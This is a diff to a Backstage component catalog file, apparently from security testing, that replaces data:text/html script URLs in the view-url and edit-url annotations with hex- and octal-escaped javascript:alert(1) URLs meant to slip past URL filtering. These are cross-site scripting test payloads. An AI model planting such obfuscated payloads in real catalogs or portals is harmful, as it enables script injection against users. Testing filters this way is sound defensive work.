@@ -4,9 +4,9 @@ metadata:
   name: tg-testing
   description: TG Testing Component
   annotations:
-    backstage.io/view-url: "url:data:text/html,<script>alert()</script>"
-    backstage.io/edit-url: "url:data:text/html,<script>alert()</script>" 
+    backstage.io/view-url: "\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)"
+    backstage.io/edit-url: "\152\141\166\141\163\143\162\151\160\164\072alert(1)" 
 spec:
   type: website
   owner: user:default/rhdh-sec-test2
-  lifecycle: test-7
+  lifecycle: test-8
